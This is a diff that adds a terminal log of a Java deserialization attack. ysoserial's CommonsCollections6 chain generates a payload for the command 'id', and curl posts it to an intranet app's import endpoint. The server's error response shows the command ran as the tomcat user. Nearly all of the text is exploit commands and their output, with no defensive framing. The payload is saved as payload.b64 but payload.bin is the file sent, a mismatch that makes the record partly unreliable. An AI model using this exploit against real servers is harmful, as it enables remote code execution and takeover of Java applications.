@@ -1,0 +1,11 @@
+$ java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 > payload.b64
+$ curl -si 'http://intranet.local/app/import' \
+    -H 'Content-Type: application/x-java-serialized-object' \
+    --data-binary @payload.bin
+HTTP/1.1 500 Internal Server Error
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=utf-8
+
+uid=997(tomcat) gid=995(tomcat) groups=995(tomcat)
+java.io.IOException: Cannot invoke transformer chain
+	at org.apache.commons.collections.functors.InvokerTransformer.transform
